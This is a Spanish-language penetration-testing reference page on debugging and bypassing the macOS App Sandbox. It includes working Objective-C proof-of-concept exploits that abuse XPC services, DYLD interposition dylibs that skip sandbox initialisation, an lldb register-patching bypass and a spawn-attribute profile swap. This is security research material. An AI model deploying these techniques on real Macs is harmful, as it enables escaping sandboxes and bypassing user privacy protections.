# Depuración y bypass del Sandbox de macOS

{{#include ../../../../../banners/hacktricks-training.md}}

## Proceso de carga del Sandbox

<figure><img src="../../../../../images/image (901).png" alt=""><figcaption><p>Imagen de <a href="http://newosxbook.com/files/HITSB.pdf">http://newosxbook.com/files/HITSB.pdf</a></p></figcaption></figure>

En la imagen anterior se puede observar **cómo se carga el sandbox** cuando se ejecuta una aplicación con el entitlement **`com.apple.security.app-sandbox`**.

El compilador enlazará `/usr/lib/libSystem.B.dylib` con el binario.

A continuación, **`libSystem.B`** llama a varias funciones hasta que **`xpc_pipe_routine`** envía los entitlements de la aplicación a **`securityd`**. Securityd comprueba si el proceso debe quedar en cuarentena dentro del sandbox y, si es así, lo pone en cuarentena.\
Por último, el sandbox se activa con una llamada a **`__sandbox_ms`**, que llama a **`__mac_syscall`**.<sup>[[1]](#references)[[3]](#references)</sup>

## Posibles bypasses

### Eludir el atributo de cuarentena

A **los archivos creados por procesos en sandbox** se les añade el **atributo de cuarentena** para impedir escapes del sandbox: si depositas una aplicación nueva e intentas ejecutarla, el flag de cuarentena lo impide. Por lo tanto, **si puedes depositar un archivo o una carpeta *sin* el atributo de cuarentena, puedes escapar del App Sandbox**; basta con depositar un bundle `.app` e iniciarlo con `open`, ya que el proceso recién iniciado se ejecuta bajo LaunchServices y no dentro de tu sandbox.

La forma fiable de conseguir que un archivo se deposite **sin cuarentena** es pedirle **a otro proceso que lo cree por ti**. Según se documenta en [**A New Era of macOS Sandbox Escapes**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), de Mickey Jin, el **App Sandbox** marca los archivos depositados con el atributo de cuarentena, pero los **servicios XPC que se ejecutan bajo el Service Sandbox no lo hacen**. Por tanto, varios servicios XPC sin autenticación podían usarse como primitiva de «blanqueo de cuarentena»:<sup>[[4]](#references)</sup>

- **CVE-2023-27944** (`TrialArchivingService`) y **CVE-2023-32414** (`ArchiveService`): extraen un archivo enviado por una app en sandbox a una ubicación elegida **sin propagar el xattr de cuarentena al contenido extraído**.
- **CVE-2023-42977** (`PerfPowerServicesSignpostReader`): un path traversal en `submitSignpostDataWithConfig:` permitía crear **directorios arbitrarios sin cuarentena**, suficiente para construir la estructura completa de un bundle `.app` fuera del contenedor.
- **CVE-2024-27864** (`diskimagescontroller.xpc`): monta una imagen DMG en cuarentena **sin poner en cuarentena el dispositivo resultante**, por lo que se pueden iniciar las apps del volumen montado.

> [!TIP]
> La extracción suele **eliminar el bit de permiso de ejecución**. La solución alternativa utilizada en CVE-2023-27944 consistía en colocar un **symlink** a un binario del sistema firmado existente (por ejemplo, `/System/Library/CoreServices/Automator Application Stub`) como ejecutable principal del bundle, lo que permite iniciarlo sin necesitar `+x` en un archivo depositado.

> [!CAUTION]
> Esto funciona porque la comprobación depende del **flag del elemento que se va a iniciar**: *«Cuando se ejecuta una app u otro código ejecutable desde Finder o la GUI, macOS comprueba su flag de cuarentena antes de cargarlo»*, y solo entonces *«se entrega a Gatekeeper para realizar las comprobaciones de seguridad completas de la “primera ejecución”»* ([Explicación: cuarentena](https://eclecticlight.co/2021/12/11/explainer-quarantine/)). Si el bundle que inicias no tiene flag, no se ejecuta la comprobación de Gatekeeper; esa es precisamente la primitiva que proporcionan los CVE anteriores.<sup>[[5]](#references)</sup>
>
> Ten en cuenta que si ya se autorizó la ejecución de un bundle `.app` (tiene un xattr de cuarentena con el flag «autorizado para ejecutarse»), también podrías abusar de él... salvo que ahora no puedes escribir dentro de bundles **`.app`** a menos que tengas permisos TCC privilegiados (que no tendrás dentro de un sandbox).

### Abusar de la funcionalidad Open

En los [**últimos ejemplos de bypass del sandbox de Word**](macos-office-sandbox-bypasses.md#word-sandbox-bypass-via-login-items-and-.zshenv) se puede ver cómo se podría abusar de la funcionalidad `open` de la CLI para eludir el sandbox.


{{#ref}}
macos-office-sandbox-bypasses.md
{{#endref}}

### Launch Agents/Daemons

Aunque una aplicación **esté diseñada para ejecutarse en un sandbox** (`com.apple.security.app-sandbox`), es posible eludir el sandbox si se **ejecuta desde un LaunchAgent** (por ejemplo, `~/Library/LaunchAgents`).\
Como se explica en [**esta publicación**](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818), si quieres obtener persistencia con una aplicación que está en sandbox, podrías hacer que se ejecute automáticamente como LaunchAgent y quizá inyectar código malicioso mediante variables de entorno de DyLib.<sup>[[6]](#references)</sup>

### Abusar de las ubicaciones de inicio automático

Si un proceso en sandbox puede **escribir** en una ubicación donde **más adelante una aplicación sin sandbox ejecutará el binario**, podrá **escapar simplemente colocando allí** el binario. Buenos ejemplos de este tipo de ubicaciones son `~/Library/LaunchAgents` y `/System/Library/LaunchDaemons`.

Para esto, puede que incluso necesites **2 pasos**: hacer que un proceso con un **sandbox más permisivo** (`file-read*`, `file-write*`) ejecute tu código, que escribirá en una ubicación donde se **ejecutará sin sandbox**.

Consulta esta página sobre **ubicaciones de inicio automático**:


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

### Abusar de otros procesos

Si desde el proceso en sandbox puedes **comprometer otros procesos** que se ejecuten en sandboxes menos restrictivos (o en ninguno), podrás escapar a sus sandboxes:


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

### Servicios Mach del sistema y del usuario disponibles

El sandbox también permite comunicarse con ciertos **servicios Mach** mediante XPC definidos en el perfil `application.sb`. Si puedes **abusar** de uno de estos servicios, quizá puedas **escapar del sandbox**.

Como se indica en [este writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/), la información sobre los servicios Mach se almacena en `/System/Library/xpc/launchd.plist`. Es posible encontrar todos los servicios Mach del sistema y del usuario buscando `<string>System</string>` y `<string>User</string>` dentro de ese archivo.<sup>[[4]](#references)</sup>

Además, puedes comprobar si un servicio Mach está disponible para una aplicación en sandbox llamando a `bootstrap_look_up`:

```objectivec
void checkService(const char *serviceName) {
    mach_port_t service_port = MACH_PORT_NULL;
    kern_return_t err = bootstrap_look_up(bootstrap_port, serviceName, &service_port);
    if (!err) {
      NSLog(@"available service:%s", serviceName);
      mach_port_deallocate(mach_task_self_, service_port);
    }
}

void print_available_xpc(void) {
    NSDictionary<NSString*, id>* dict = [NSDictionary dictionaryWithContentsOfFile:@"/System/Library/xpc/launchd.plist"];
    NSDictionary<NSString*, id>* launchDaemons = dict[@"LaunchDaemons"];
    for (NSString* key in launchDaemons) {
      NSDictionary<NSString*, id>* job = launchDaemons[key];
      NSDictionary<NSString*, id>* machServices = job[@"MachServices"];
      for (NSString* serviceName in machServices) {
          checkService(serviceName.UTF8String);
      }
    }
}
```

### Servicios Mach PID disponibles

Estos servicios Mach se aprovecharon por primera vez para [escapar del sandbox en este writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/). En ese momento, **todos los servicios XPC necesarios** para una aplicación y su framework eran visibles en el dominio PID de la app (son servicios Mach con `ServiceType` como `Application`).<sup>[[4]](#references)</sup>

Para **contactar con un servicio XPC del dominio PID**, solo hay que registrarlo dentro de la app con una línea como esta:

```objectivec
[[NSBundle bundleWithPath:@“/System/Library/PrivateFrameworks/ShoveService.framework"]load];
```

Además, es posible encontrar todos los servicios Mach de **Application** buscando `<string>Application</string>` dentro de `System/Library/xpc/launchd.plist`.

Otra forma de encontrar servicios xpc válidos es comprobar los que están en:

```bash
find /System/Library/Frameworks -name "*.xpc"
find /System/Library/PrivateFrameworks -name "*.xpc"
```

Se pueden encontrar varios ejemplos que abusan de esta técnica en el [**writeup original**](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/); sin embargo, a continuación se muestran algunos ejemplos resumidos.<sup>[[4]](#references)</sup>

#### /System/Library/PrivateFrameworks/StorageKit.framework/XPCServices/storagekitfsrunner.xpc

Este servicio permite todas las conexiones XPC al devolver siempre `YES`, y el método `runTask:arguments:withReply:` ejecuta un comando arbitrario con parámetros arbitrarios.

El exploit era «así de sencillo»:

```objectivec
@protocol SKRemoteTaskRunnerProtocol
-(void)runTask:(NSURL *)task arguments:(NSArray *)args withReply:(void (^)(NSNumber *, NSError *))reply;
@end

void exploit_storagekitfsrunner(void) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/StorageKit.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.storagekitfsrunner"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(SKRemoteTaskRunnerProtocol)];
    [conn setInterruptionHandler:^{NSLog(@"connection interrupted!");}];
    [conn setInvalidationHandler:^{NSLog(@"connection invalidated!");}];
    [conn resume];
    
    [[conn remoteObjectProxy] runTask:[NSURL fileURLWithPath:@"/usr/bin/touch"] arguments:@[@"/tmp/sbx"] withReply:^(NSNumber *bSucc, NSError *error) {
        NSLog(@"run task result:%@, error:%@", bSucc, error);
    }];
}
```

#### /System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework/XPCServices/AudioAnalyticsHelperService.xpc

Este servicio XPC permitía el acceso a todos los clientes al devolver siempre `YES`, y el método `createZipAtPath:hourThreshold:withReply:` aceptaba la ruta a una carpeta y la comprimía en un archivo ZIP.

Por lo tanto, es posible generar una estructura de carpeta de app falsa, comprimirla y luego descomprimirla y ejecutarla para escapar del sandbox, ya que los archivos nuevos no tendrán el atributo de cuarentena.

El exploit era:

```objectivec
@protocol AudioAnalyticsHelperServiceProtocol
-(void)pruneZips:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
-(void)createZipAtPath:(NSString *)path hourThreshold:(int)threshold withReply:(void (^)(id *))reply;
@end
void exploit_AudioAnalyticsHelperService(void) {
    NSString *currentPath = NSTemporaryDirectory();
    chdir([currentPath UTF8String]);
    NSLog(@"======== preparing payload at the current path:%@", currentPath);
    system("mkdir -p compressed/poc.app/Contents/MacOS; touch 1.json");
    [@"#!/bin/bash\ntouch /tmp/sbx\n" writeToFile:@"compressed/poc.app/Contents/MacOS/poc" atomically:YES encoding:NSUTF8StringEncoding error:0];
    system("chmod +x compressed/poc.app/Contents/MacOS/poc");
    
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/AudioAnalyticsInternal.framework"] load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.internal.audioanalytics.helper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(AudioAnalyticsHelperServiceProtocol)];
    [conn resume];
    
    [[conn remoteObjectProxy] createZipAtPath:currentPath hourThreshold:0 withReply:^(id *error){
        NSDirectoryEnumerator *dirEnum = [[[NSFileManager alloc] init] enumeratorAtPath:currentPath];
        NSString *file;
        while ((file = [dirEnum nextObject])) {
            if ([[file pathExtension] isEqualToString: @"zip"]) {
                // open the zip
                NSString *cmd = [@"open " stringByAppendingString:file];
                system([cmd UTF8String]);

                sleep(3); // wait for decompression and then open the payload (poc.app)
                NSString *cmd2 = [NSString stringWithFormat:@"open /Users/%@/Downloads/%@/poc.app", NSUserName(), [file stringByDeletingPathExtension]];
                system([cmd2 UTF8String]);
                break;
            }
        }
    }];
}
```

#### /System/Library/PrivateFrameworks/WorkflowKit.framework/XPCServices/ShortcutsFileAccessHelper.xpc

Este servicio XPC permite conceder acceso de lectura y escritura a una URL arbitraria al cliente XPC mediante el método `extendAccessToURL:completion:`, que aceptaba cualquier conexión. Como el servicio XPC tiene FDA, es posible abusar de estos permisos para omitir por completo TCC.

El exploit era:

```objectivec
@protocol WFFileAccessHelperProtocol
- (void) extendAccessToURL:(NSURL *) url completion:(void (^) (FPSandboxingURLWrapper *, NSError *))arg2;
@end
typedef int (*PFN)(const char *);
void expoit_ShortcutsFileAccessHelper(NSString *target) {
    [[NSBundle bundleWithPath:@"/System/Library/PrivateFrameworks/WorkflowKit.framework"]load];
    NSXPCConnection * conn = [[NSXPCConnection alloc] initWithServiceName:@"com.apple.WorkflowKit.ShortcutsFileAccessHelper"];
    conn.remoteObjectInterface = [NSXPCInterface interfaceWithProtocol:@protocol(WFFileAccessHelperProtocol)];
    [conn.remoteObjectInterface setClasses:[NSSet setWithArray:@[[NSError class], objc_getClass("FPSandboxingURLWrapper")]] forSelector:@selector(extendAccessToURL:completion:) argumentIndex:0 ofReply:1];
    [conn resume];
    
    [[conn remoteObjectProxy] extendAccessToURL:[NSURL fileURLWithPath:target] completion:^(FPSandboxingURLWrapper *fpWrapper, NSError *error) {
        NSString *sbxToken = [[NSString alloc] initWithData:[fpWrapper scope] encoding:NSUTF8StringEncoding];
        NSURL *targetURL = [fpWrapper url];
        
        void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib", 2);
        PFN sandbox_extension_consume = (PFN)dlsym(h, "sandbox_extension_consume");
        if (sandbox_extension_consume([sbxToken UTF8String]) == -1)
            NSLog(@"Fail to consume the sandbox token:%@", sbxToken);
        else {
            NSLog(@"Got the file R&W permission with sandbox token:%@", sbxToken);
            NSLog(@"Read the target content:%@", [NSData dataWithContentsOfURL:targetURL]);
        }
    }];
}
```

### Compilación estática y enlace dinámico

[**Esta investigación**](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/) descubrió 2 formas de eludir el Sandbox. Como el sandbox se aplica desde userland cuando se carga la biblioteca **libSystem**, si un binario pudiera evitar cargarla, nunca quedaría dentro del sandbox:<sup>[[2]](#references)</sup>

- Si el binario estuviera **compilado completamente de forma estática**, podría evitar cargar esa biblioteca.
- Si el **binario no necesitara cargar ninguna biblioteca** (porque el linker también está en libSystem), no necesitaría cargar libSystem.

### Shellcodes

Ten en cuenta que **incluso los shellcodes** en ARM64 necesitan enlazarse con `libSystem.dylib`:

```bash
ld -o shell shell.o -macosx_version_min 13.0
ld: dynamic executables or dylibs must link with libSystem.dylib for architecture arm64
```

### Restricciones no heredadas

Como se explica en el **[bonus de este writeup](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)**, una restricción del sandbox como:<sup>[[4]](#references)</sup>

```
(version 1)
(allow default)
(deny file-write* (literal "/private/tmp/sbx"))
```

puede ser bypassed por un nuevo proceso que ejecute, por ejemplo:

```bash
mkdir -p /tmp/poc.app/Contents/MacOS
echo '#!/bin/sh\n touch /tmp/sbx' > /tmp/poc.app/Contents/MacOS/poc
chmod +x /tmp/poc.app/Contents/MacOS/poc
open /tmp/poc.app
```

Sin embargo, por supuesto, este nuevo proceso no heredará los entitlements ni los privilegios del proceso padre.

### Reemplazar un sandbox heredado con atributos de spawn (versiones anteriores de macOS)

Un proceso hijo normal de `posix_spawn()` hereda el sandbox de su proceso padre. En las versiones de macOS anteriores a la corrección de febrero de 2026, un proceso padre en un sandbox podía, en cambio, pasar un **nombre de perfil integrado** a la política MAC de `Sandbox` mediante `posix_spawnattr_setmacpolicyinfo_np()`. El proceso hijo recibía entonces ese perfil *en lugar de las restricciones* del proceso padre. El perfil integrado `no-network` seguía permitiendo el acceso al directorio de inicio del usuario, por lo que un proceso hijo como `/bin/bash` podía actuar sobre archivos a los que el proceso padre de App Sandbox no podía acceder. Esto es distinto de la [ruta de LaunchServices `open`](#not-inherited-restrictions), en la que un servicio independiente inicia el proceso. Consulta [Atributos de spawn específicos de la política MACF](../../macos-macf-mandatory-access-control-framework.md#policy-specific-spawn-attributes-as-a-macf-input) para conocer la ruta general de entrada.<sup>[[7]](#references)</sup>

Para probar este límite en un **host de macOS afectado y aislado**, crea un canary inocuo en el directorio de inicio, fuera del contenedor de la app. Ejecuta el mismo proceso hijo primero desde un proceso padre que ya esté en un sandbox, usando `posix_spawn()` normal, y después con un blob de atributos de spawn de Sandbox que seleccione `no-network`; compara si el proceso hijo puede leer el canary. El siguiente fragmento usa la definición privada de `sandbox_spawnattr_t` y las declaraciones de funciones del [launcher de ejemplo](https://gist.github.com/Siguza/e9e6e2387b11ee5aec1b1c27c60d43ec) de Siguza. Añade el manejo habitual de errores al integrarlo en una app de prueba.<sup>[[7]](#references)[[8]](#references)</sup>

```c
sandbox_spawnattr_t sb;
posix_spawnattr_t attr;
pid_t pid;
char *argv[] = {"/bin/bash", "-c", "cat \"$HOME/sandbox-canary.txt\"", NULL};
sandbox_spawnattrs_init(&sb);
sandbox_spawnattrs_setprofilename(&sb, "no-network");
posix_spawnattr_init(&attr);
posix_spawnattr_setmacpolicyinfo_np(&attr, "Sandbox", &sb, sizeof(sb));
int err = posix_spawn(&pid, "/bin/bash", NULL, &attr, argv, environ);
if (!err) waitpid(pid, NULL, 0);
```

Un retorno exitoso de `posix_spawn()` no demuestra que se haya escapado del sandbox: comprueba el **acceso efectivo a archivos del proceso hijo** comparándolo con el comportamiento habitual de un proceso hijo. Los sistemas con los parches aplicados rechazan un perfil integrado solicitado por un proceso que ya está en un sandbox, a menos que tenga el entitlement privado `com.apple.private.security.sandbox-spawnattrs`. No consideres este comportamiento histórico como un bypass actual.<sup>[[7]](#references)</sup>

### Entitlements

Ten en cuenta que incluso si el sandbox podría **permitir algunas **acciones** cuando una aplicación tiene un **entitlement** específico, como en:

```scheme
(when (entitlement "com.apple.security.network.client")
      (allow network-outbound (remote ip))
      (allow mach-lookup
             (global-name "com.apple.airportd")
             (global-name "com.apple.cfnetwork.AuthBrokerAgent")
             (global-name "com.apple.cfnetwork.cfnetworkagent")
             [...]
```

### Interposting Bypass

Para obtener más información sobre **Interposting**, consulta:


{{#ref}}
../../../macos-proces-abuse/macos-function-hooking.md
{{#endref}}

#### Interpost `_libsecinit_initializer` para evitar el sandbox

```c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>

void _libsecinit_initializer(void);

void overriden__libsecinit_initializer(void) {
    printf("_libsecinit_initializer called\n");
}

__attribute__((used, section("__DATA,__interpose"))) static struct {
	void (*overriden__libsecinit_initializer)(void);
	void (*_libsecinit_initializer)(void);
}
_libsecinit_initializer_interpose = {overriden__libsecinit_initializer, _libsecinit_initializer};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand
_libsecinit_initializer called
Sandbox Bypassed!
```

#### Interceptar `__mac_syscall` para evitar el Sandbox

```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib

#include <stdio.h>
#include <string.h>

// Forward Declaration
int __mac_syscall(const char *_policyname, int _call, void *_arg);

// Replacement function
int my_mac_syscall(const char *_policyname, int _call, void *_arg) {
    printf("__mac_syscall invoked. Policy: %s, Call: %d\n", _policyname, _call);
    if (strcmp(_policyname, "Sandbox") == 0 && _call == 0) {
        printf("Bypassing Sandbox initiation.\n");
        return 0; // pretend we did the job without actually calling __mac_syscall
    }
    // Call the original function for other cases
    return __mac_syscall(_policyname, _call, _arg);
}

// Interpose Definition
struct interpose_sym {
    const void *replacement;
    const void *original;
};

// Interpose __mac_syscall with my_mac_syscall
__attribute__((used)) static const struct interpose_sym interposers[] __attribute__((section("__DATA, __interpose"))) = {
    { (const void *)my_mac_syscall, (const void *)__mac_syscall },
};
```

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./sand

__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 2
__mac_syscall invoked. Policy: Sandbox, Call: 0
Bypassing Sandbox initiation.
__mac_syscall invoked. Policy: Quarantine, Call: 87
__mac_syscall invoked. Policy: Sandbox, Call: 4
Sandbox Bypassed!
```

### Depurar y evadir Sandbox con lldb

Compilemos una aplicación que debería estar en sandbox:

{{#tabs}}
{{#tab name="sand.c"}}

```c
#include <stdlib.h>
int main() {
    system("cat ~/Desktop/del.txt");
}
```

{{#endtab}}

{{#tab name="entitlements.xml"}}

```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>com.apple.security.app-sandbox</key>
<true/>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="Info.plist"}}

```xml
<plist version="1.0">
<dict>
    <key>CFBundleIdentifier</key>
    <string>xyz.hacktricks.sandbox</string>
    <key>CFBundleName</key>
    <string>Sandbox</string>
</dict>
</plist>
```

{{#endtab}}
{{#endtabs}}

Luego compila la app:

```bash
# Compile it
gcc -Xlinker -sectcreate -Xlinker __TEXT -Xlinker __info_plist -Xlinker Info.plist sand.c -o sand

# Create a certificate for "Code Signing"

# Apply the entitlements via signing
codesign -s <cert-name> --entitlements entitlements.xml sand
```

> [!CAUTION]
> La app intentará **leer** el archivo **`~/Desktop/del.txt`**, algo que el **Sandbox no permitirá**.\
> Crea un archivo ahí, ya que, una vez que se omita el Sandbox, podrá leerlo:
>
> ```bash
> echo "Sandbox Bypassed" > ~/Desktop/del.txt
> ```

Vamos a depurar la aplicación para ver cuándo se carga el Sandbox:

```bash
# Load app in debugging
lldb ./sand

# Set breakpoint in xpc_pipe_routine
(lldb) b xpc_pipe_routine

# run
(lldb) r

# This breakpoint is reached by different functionalities
# Check in the backtrace is it was de sandbox one the one that reached it
# We are looking for the one libsecinit from libSystem.B, like the following one:
(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
  * frame #0: 0x00000001873d4178 libxpc.dylib`xpc_pipe_routine
    frame #1: 0x000000019300cf80 libsystem_secinit.dylib`_libsecinit_appsandbox + 584
    frame #2: 0x00000001874199c4 libsystem_trace.dylib`_os_activity_initiate_impl + 64
    frame #3: 0x000000019300cce4 libsystem_secinit.dylib`_libsecinit_initializer + 80
    frame #4: 0x0000000193023694 libSystem.B.dylib`libSystem_initializer + 272

# To avoid lldb cutting info
(lldb) settings set target.max-string-summary-length 10000

# The message is in the 2 arg of the xpc_pipe_routine function, get it with:
(lldb) p (char *) xpc_copy_description($x1)
(char *) $0 = 0x000000010100a400 "<dictionary: 0x6000026001e0> { count = 5, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REGISTRATION_MESSAGE_SHORT_NAME_KEY\" => <string: 0x600000c00d80> { length = 4, contents = \"sand\" }\n\t\"SECINITD_REGISTRATION_MESSAGE_IMAGE_PATHS_ARRAY_KEY\" => <array: 0x600000c00120> { count = 42, capacity = 64, contents =\n\t\t0: <string: 0x600000c000c0> { length = 14, contents = \"/tmp/lala/sand\" }\n\t\t1: <string: 0x600000c001e0> { length = 22, contents = \"/private/tmp/lala/sand\" }\n\t\t2: <string: 0x600000c000f0> { length = 26, contents = \"/usr/lib/libSystem.B.dylib\" }\n\t\t3: <string: 0x600000c00180> { length = 30, contents = \"/usr/lib/system/libcache.dylib\" }\n\t\t4: <string: 0x600000c00060> { length = 37, contents = \"/usr/lib/system/libcommonCrypto.dylib\" }\n\t\t5: <string: 0x600000c001b0> { length = 36, contents = \"/usr/lib/system/libcompiler_rt.dylib\" }\n\t\t6: <string: 0x600000c00330> { length = 33, contents = \"/usr/lib/system/libcopyfile.dylib\" }\n\t\t7: <string: 0x600000c00210> { length = 35, contents = \"/usr/lib/system/libcorecry"...

# The 3 arg is the address were the XPC response will be stored
(lldb) register read x2
  x2 = 0x000000016fdfd660

# Move until the end of the function
(lldb) finish

# Read the response
## Check the address of the sandbox container in SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY
(lldb) memory read -f p 0x000000016fdfd660 -c 1
0x16fdfd660: 0x0000600003d04000
(lldb) p (char *) xpc_copy_description(0x0000600003d04000)
(char *) $4 = 0x0000000100204280 "<dictionary: 0x600003d04000> { count = 7, transaction: 0, voucher = 0x0, contents =\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ID_KEY\" => <string: 0x600000c04d50> { length = 22, contents = \"xyz.hacktricks.sandbox\" }\n\t\"SECINITD_REPLY_MESSAGE_QTN_PROC_FLAGS_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_MESSAGE_CONTAINER_ROOT_PATH_KEY\" => <string: 0x600000c04e10> { length = 65, contents = \"/Users/carlospolop/Library/Containers/xyz.hacktricks.sandbox/Data\" }\n\t\"SECINITD_REPLY_MESSAGE_SANDBOX_PROFILE_DATA_KEY\" => <data: 0x600001704100>: { length = 19027 bytes, contents = 0x0000f000ba0100000000070000001e00350167034d03c203... }\n\t\"SECINITD_REPLY_MESSAGE_VERSION_NUMBER_KEY\" => <int64: 0xaa3e660cef06712f>: 1\n\t\"SECINITD_MESSAGE_TYPE_KEY\" => <uint64: 0xaabe660cef067137>: 2\n\t\"SECINITD_REPLY_FAILURE_CODE\" => <uint64: 0xaabe660cef067127>: 0\n}"

# To bypass the sandbox we need to skip the call to __mac_syscall
# Lets put a breakpoint in __mac_syscall when x1 is 0 (this is the code to enable the sandbox)
(lldb) breakpoint set --name __mac_syscall --condition '($x1 == 0)'
(lldb) c

# The 1 arg is the name of the policy, in this case "Sandbox"
(lldb) memory read -f s $x0
0x19300eb22: "Sandbox"

#
# BYPASS
#

# Due to the previous bp, the process will be stopped in:
Process 2517 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
    frame #0: 0x0000000187659900 libsystem_kernel.dylib`__mac_syscall
libsystem_kernel.dylib`:
->  0x187659900 <+0>:  mov    x16, #0x17d
    0x187659904 <+4>:  svc    #0x80
    0x187659908 <+8>:  b.lo   0x187659928               ; <+40>
    0x18765990c <+12>: pacibsp

# To bypass jump to the b.lo address modifying some registers first
(lldb) breakpoint delete 1 # Remove bp
(lldb) register write $pc 0x187659928 #b.lo address
(lldb) register write $x0 0x00
(lldb) register write $x1 0x00
(lldb) register write $x16 0x17d
(lldb) c
Process 2517 resuming
Sandbox Bypassed!
Process 2517 exited with status = 0 (0x00000000)
```

> [!WARNING] > **Incluso con el Sandbox bypassed, TCC** preguntará al usuario si quiere permitir que el proceso lea archivos del escritorio

## References

- [1] [Jonathan Levin - The Apple Sandbox: Más profundo en el atolladero (diapositivas de HITB GSEC 2016)](http://newosxbook.com/files/HITSB.pdf)
- [2] [Saagar Jha - Mac App Store Sandbox Escape](https://saagarjha.com/blog/2020/05/20/mac-app-store-sandbox-escape/)
- [3] [Jonathan Levin - The Apple Sandbox: Más profundo en el atolladero (HITB GSEC 2016)](https://www.youtube.com/watch?v=mG715HcDgO8)
- [4] [Mickey Jin - Una nueva era de macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/) (unquarantined drops via XPC services: CVE-2023-27944, CVE-2023-32414, CVE-2023-42977, CVE-2024-27864)
- [5] [The Eclectic Light Company - Explicación: Quarantine](https://eclecticlight.co/2021/12/11/explainer-quarantine/)
- [6] [Vicarius vSociety - CVE-2023-26818 (Sandbox): macOS TCC Bypass con Telegram mediante inyección de DyLib (Parte 2)](https://www.vicarius.io/vsociety/posts/cve-2023-26818-sandbox-macos-tcc-bypass-w-telegram-using-dylib-injection-part-2-3?q=CVE-2023-26818)
- [7] [Escaping the Apple Sandbox mediante la ejecución de un ejecutable](https://wts.dev/posts/sandbox-spawnattrs-escape/)
- [8] [Siguza - sandbox-exec, pero para perfiles integrados](https://gist.github.com/Siguza/e9e6e2387b11ee5aec1b1c27c60d43ec)
{{#include ../../../../../banners/hacktricks-training.md}}
